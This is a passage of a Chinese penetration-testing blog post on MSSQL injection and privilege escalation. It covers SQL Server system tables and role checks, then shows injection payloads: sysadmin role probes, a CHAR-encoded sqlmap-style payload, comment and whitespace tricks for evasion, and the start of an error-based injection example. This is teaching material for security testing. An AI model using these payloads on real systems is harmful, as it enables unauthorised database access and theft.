<!DOCTYPE html>
<html lang="zh-cn">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>MSSQL 注入与提权方法整理 - Geekby&#39;s Blog</title><meta name="Description" content="MSSQL 注入与提权方法整理"><meta property="og:title" content="MSSQL 注入与提权方法整理" />
<meta property="og:description" content="MSSQL 注入与提权方法整理" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.geekby.site/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-01-20T09:53:00+08:00" />
<meta property="article:modified_time" content="2021-01-20T09:53:00+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="MSSQL 注入与提权方法整理"/>
<meta name="twitter:description" content="MSSQL 注入与提权方法整理"/>
<meta name="application-name" content="Geekby&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/" /><link rel="prev" href="https://www.geekby.site/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/" /><link rel="next" href="https://www.geekby.site/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "MSSQL 注入与提权方法整理",
        "inLanguage": "zh-cn",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/www.geekby.site\/2021\/01\/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86\/"
        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "渗透测试, 提权","wordcount":  1501 ,
        "url": "https:\/\/www.geekby.site\/2021\/01\/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86\/","datePublished": "2021-01-20T09:53:00+08:00","dateModified": "2021-01-20T09:53:00+08:00","publisher": {
            "@type": "Organization",
            "name": "Geekby","logo": {
                    "@type": "ImageObject",
                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
                    "width":  358 ,
                    "height":  330 
                }},"author": {
                "@type": "Person",
                "name": "Geekby"
            },"description": "MSSQL 注入与提权方法整理"
    }
    </script></head>
    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                    <i class="fas fa-adjust fa-fw"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        取消
                    </a>
                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                <i class="fas fa-adjust fa-fw"></i>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">目录</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animated flipInX">MSSQL 注入与提权方法整理</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="far fa-folder fa-fw"></i>渗透测试</a>&nbsp;<a href="/categories/%E5%B8%B8%E7%94%A8/"><i class="far fa-folder fa-fw"></i>常用</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-01-20">2021-01-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1501 字&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 8 分钟&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>目录</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#1-sql-server-相关基础简介">1 SQL Server 相关基础简介</a>
      <ul>
        <li><a href="#11-默认库介绍">1.1 默认库介绍</a></li>
        <li><a href="#12-字段介绍">1.2 字段介绍</a></li>
      </ul>
    </li>
    <li><a href="#2-sql-server-信息收集">2 SQL Server 信息收集</a>
      <ul>
        <li><a href="#21-权限判断">2.1 权限判断</a>
          <ul>
            <li><a href="#211-服务器级别">2.1.1 服务器级别</a></li>
            <li><a href="#212-数据库级别的角色">2.1.2 数据库级别的角色</a></li>
          </ul>
        </li>
        <li><a href="#22-基本信息">2.2 基本信息</a></li>
        <li><a href="#23-判断站库分离">2.3 判断站库分离</a></li>
      </ul>
    </li>
    <li><a href="#3-sql-server-语法">3 SQL Server 语法</a>
      <ul>
        <li><a href="#31-注释符号">3.1 注释符号</a></li>
        <li><a href="#32-空白字符">3.2 空白字符</a></li>
        <li><a href="#33-运算符号">3.3 运算符号</a></li>
        <li><a href="#34-语法定义符号">3.4 语法定义符号</a></li>
      </ul>
    </li>
    <li><a href="#4-mssql-注入">4 MSSQL 注入</a>
      <ul>
        <li><a href="#41-显错注入">4.1 显错注入</a>
          <ul>
            <li><a href="#411-原理">4.1.1 原理</a></li>
            <li><a href="#412-其它用法">4.1.2 其它用法</a></li>
            <li><a href="#413-简单注入绕过">4.1.3 简单注入绕过</a></li>
          </ul>
        </li>
        <li><a href="#42-盲注">4.2 盲注</a>
          <ul>
            <li><a href="#421-布尔盲注">4.2.1 布尔盲注</a></li>
            <li><a href="#422-时间盲注">4.2.2 时间盲注</a></li>
          </ul>
        </li>
        <li><a href="#42-联合注入">4.2 联合注入</a></li>
      </ul>
    </li>
    <li><a href="#5-mssql-提权">5 MSSQL 提权</a>
      <ul>
        <li><a href="#51-备份拿-shell">5.1 备份拿 shell</a>
          <ul>
            <li><a href="#511-路径的寻找">5.1.1 路径的寻找</a></li>
            <li><a href="#512-差异备份">5.1.2 差异备份</a></li>
            <li><a href="#513-log-备份">5.1.3 LOG 备份</a></li>
          </ul>
        </li>
        <li><a href="#52-xp_cmdshell">5.2 xp_cmdshell</a></li>
        <li><a href="#53-sp_oacreate">5.3 sp_oacreate</a></li>
        <li><a href="#54-沙盒提权">5.4 沙盒提权</a></li>
        <li><a href="#55-利用-mssql-模拟登录提权">5.5 利用 mssql 模拟登录提权</a>
          <ul>
            <li><a href="#551-赋予用户-myuser1-权限来模拟-myuser2-myuser3及sa">5.5.1 赋予用户 MyUser1 权限来模拟 MyUser2, MyUser3,及sa</a></li>
            <li><a href="#552--查找可以模拟登录的用户">5.5.2  查找可以模拟登录的用户</a></li>
            <li><a href="#553--模拟-sql-server-用户登陆">5.5.3  模拟 SQL Server 用户登陆</a></li>
            <li><a href="#534-ps-工具化">5.3.4 PS 工具化</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#6-clr-提权">6 CLR 提权</a>
      <ul>
        <li><a href="#61-sql-server-clr-介绍">6.1 SQL Server CLR 介绍</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h1 id="mssql-注入与提权方法整理">MSSQL 注入与提权方法整理</h1>
<h2 id="1-sql-server-相关基础简介">1 SQL Server 相关基础简介</h2>
<h3 id="11-默认库介绍">1.1 默认库介绍</h3>
<ul>
<li>master - 用于记录所有 SQL Server 系统级别的信息，这些信息用于控制用户数据库和数据操作。</li>
<li>model - SQL Server 为用户数据库提供的样板，新的用户数据库都以 model 数据库为基础</li>
<li>msdb - 由 Enterprise Manager 和 Agent 使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息。</li>
<li>tempdb - 它为临时表和其他临时工作提供了一个存储区。</li>
</ul>
<div class="details admonition info open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-info-circle fa-fw"></i>信息<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">这里我们经常要打交道的库也就是 master，其中储存了所有数据库名与存储过程。类比于 MySQL 中的 <code>information_schema</code> 元数据库。</div>
        </div>
    </div>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120143745.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120143745.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120143745.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120143745.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120143745.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120143745.png-water_print" /></p>
<p>以 master 库为例可以看到上面几个类别，其中视图表 <code>master.dbo.sysdatabases</code> 储存所有数据库名，其他数据库的视图则储存它本库的表名与列名。每一个库的视图表都有 <code>syscolumns</code> 存储着所有的字段，可编程性储存着我们的函数。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">sysdatabases</span><span class="p">;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>查询所有数据库的名称。</p>
<h3 id="12-字段介绍">1.2 字段介绍</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="n">top</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="n">xtype</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">sysobjects</span><span class="p">;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>xtype 可以是下列对象类型中的一种：</p>
<ul>
<li>C = CHECK 约束</li>
<li>D = 默认值或 DEFAULT 约束</li>
<li>F = FOREIGN KEY 约束</li>
<li>L = 日志</li>
<li>FN = 标量函数</li>
<li>IF = 内嵌表函数</li>
<li>P = 存储过程</li>
<li>PK = PRIMARY KEY 约束（类型是 K）</li>
<li>RF = 复制筛选存储过程</li>
<li>S = 系统表</li>
<li>TF = 表函数</li>
<li>TR = 触发器</li>
<li>U = 用户表</li>
<li>UQ = UNIQUE 约束（类型是 K）</li>
<li>V = 视图</li>
<li>X = 扩展存储过程</li>
</ul>
<h2 id="2-sql-server-信息收集">2 SQL Server 信息收集</h2>
<h3 id="21-权限判断">2.1 权限判断</h3>
<p>SQL Server 内部按作用范围来分有三大主体:</p>
<ul>
<li>Windows 级别主体</li>
<li>服务器级别主体</li>
<li>数据库级别主体</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210121092915.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210121092915.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210121092915.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210121092915.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210121092915.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210121092915.png-water_print" /></p>
<h4 id="211-服务器级别">2.1.1 服务器级别</h4>
<p>在微软的官方文档中可以看到， <code>IS_SRVROLEMEMBER ( 'role' [ , 'login' ] ) </code>，函数 role 的有效值是用户定义的服务器角色和以下固定服务器角色：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120145938.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120145938.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120145938.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120145938.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120145938.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120145938.png-water_print" /></p>
<p>返回类型：</p>
<table>
<thead>
<tr>
<th>返回值</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>login 不是 role 的成员。</td>
</tr>
<tr>
<td>1</td>
<td>login 是 role 的成员。</td>
</tr>
<tr>
<td>NULL</td>
<td>role 或 login 无效，或者没有查看角色成员身份的权限。</td>
</tr>
</tbody>
</table>
<p>最终我们可以构造语句：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">is_srvrolemember</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">))</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">is_srvrolemember</span><span class="p">(</span><span class="s1">&#39;serveradmin&#39;</span><span class="p">))</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">is_srvrolemember</span><span class="p">(</span><span class="s1">&#39;setupadmin&#39;</span><span class="p">))</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">is_srvrolemember</span><span class="p">(</span><span class="s1">&#39;securityadmin&#39;</span><span class="p">))</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">is_srvrolemember</span><span class="p">(</span><span class="s1">&#39;diskadmin&#39;</span><span class="p">))</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">is_srvrolemember</span><span class="p">(</span><span class="s1">&#39;bulkadmin&#39;</span><span class="p">))</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>在 SQLMap 中使用 &ndash;is-dba 命令可以判断是否为管理员权限</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select * from admin where id =1 AND 5560 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(113)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (IS_SRVROLEMEMBER(CHAR(115)+CHAR(121)+CHAR(115)+CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110))=1) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(112)+CHAR(120)+CHAR(113)))
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="212-数据库级别的角色">2.1.2 数据库级别的角色</h4>
<p><code>select IS_MEMBER('db_owner')  </code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120150401.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120150401.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120150401.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120150401.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120150401.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120150401.png-water_print" /></p>
<h3 id="22-基本信息">2.2 基本信息</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">@@version // 数据库版本
</span></span><span class="line"><span class="cl">user  //获取当前数据库用户名
</span></span><span class="line"><span class="cl">db_name() // 当前数据库名 其中db_name(N)可以来遍历其他数据库
</span></span><span class="line"><span class="cl">;select user //查询是否支持多语句
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="23-判断站库分离">2.3 判断站库分离</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">info</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">host_name</span><span class="p">()</span><span class="o">=@@</span><span class="n">servername</span><span class="p">;</span><span class="c1">--&#39;
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>最简单的方法，当然你可以调用 xp_cmdshell 就可以通过 cmd 来判断。</p>
<p>通过简单的判断数据库版本，当前用户权限，我们就可以想下一步怎么去做，比如 2005 的 xp_cmdshell 的权限一般是 system 而 2008 的权限一般是 <code>ntauthority\network service</code></p>
<h2 id="3-sql-server-语法">3 SQL Server 语法</h2>
<h3 id="31-注释符号">3.1 注释符号</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/*
</span></span><span class="line"><span class="cl">-- 
</span></span><span class="line"><span class="cl">;%00
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="32-空白字符">3.2 空白字符</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/**/
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="33-运算符号">3.3 运算符号</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+   加法运算
</span></span><span class="line"><span class="cl">-   减法运算
</span></span><span class="line"><span class="cl">*   乘法运算
</span></span><span class="line"><span class="cl">/   除法运算，如果两个表达式值都是整数，那么结果只取整数值，小数值将略去
</span></span><span class="line"><span class="cl">%   取模运算，返回两数相除后的余数
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&amp;   位与逻辑运算，从两个表达式中取对应的位。当且仅当输入表达式中两个位的值都为 1 时，结果中的位才被设置为 1，否则，结果中的位被设置为 0
</span></span><span class="line"><span class="cl">|   位或逻辑运算，从两个表达式中取对应的位。如果输入表达式中两个位只要有一个的值为 1 时，结果的位就被设置为 1，只有当两个位的值都为 0 时，结果中的位才被设置为 0
</span></span><span class="line"><span class="cl">^   位异或运算，从两个表达式中取对应的位。如果输入表达式中两个位只有一个的值为 1 时，结果中的位就被设置为 1；只有当两个位的值都为 0 或 1 时，结果中的位才被设置为0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">=   等于 
</span></span><span class="line"><span class="cl">&lt;&gt;  不等于
</span></span><span class="line"><span class="cl">&gt;   大于  
</span></span><span class="line"><span class="cl">!=  不等于
</span></span><span class="line"><span class="cl">&lt;   小于  
</span></span><span class="line"><span class="cl">!&lt;  不小于
</span></span><span class="line"><span class="cl">&gt;=  大于或等于   
</span></span><span class="line"><span class="cl">!&gt;  不大于
</span></span><span class="line"><span class="cl">&lt;=  小于或等于
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ALL 如果一组的比较都为 true，则比较结果为 true
</span></span><span class="line"><span class="cl">AND 如果两个布尔表达式都为 true，则结果为 true；如果其中一个表达式为 false，则结果为 false
</span></span><span class="line"><span class="cl">ANY 如果一组的比较中任何一个为 true，则结果为 true
</span></span><span class="line"><span class="cl">BETWEEN 如果操作数在某个范围之内，那么结果为 true
</span></span><span class="line"><span class="cl">EXISTS  如果子查询中包含了一些行，那么结果为 true
</span></span><span class="line"><span class="cl">IN  如果操作数等于表达式列表中的一个，那么结果为 true
</span></span><span class="line"><span class="cl">LIKE    如果操作数与某种模式相匹配，那么结果为 true
</span></span><span class="line"><span class="cl">NOT 对任何其他布尔运算符的结果值取反
</span></span><span class="line"><span class="cl">OR  如果两个布尔表达式中的任何一个为 true，那么结果为 true
</span></span><span class="line"><span class="cl">SOME    如果在一组比较中，有些比较为 true，那么结果为 true
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="34-语法定义符号">3.4 语法定义符号</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt; &gt; 尖括号，用于分隔字符串，字符串为语法元素的名称，SQL 语言的非终结符。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">::= 定义操作符。用在生成规则中，分隔规则定义的元素和规则定义。 被定义的元素位于操作符的左边，规则定义位于操作符的右边。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[ ] 方括号表示规则中的可选元素。方括号中的规则部分可以明确指定也可以省略。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">{ } 花括号聚集规则中的元素。在花括号中的规则部分必须明确指定。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">() 括号是分组运算符
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="4-mssql-注入">4 MSSQL 注入</h2>
<h3 id="41-显错注入">4.1 显错注入</h3>
<h4 id="411-原理">4.1.1 原理</h4>
<p>MSSQL 报错注入利用的就是显示或隐式转换来报错注入，比如以下就是典型的隐式转换</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="c1">--
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
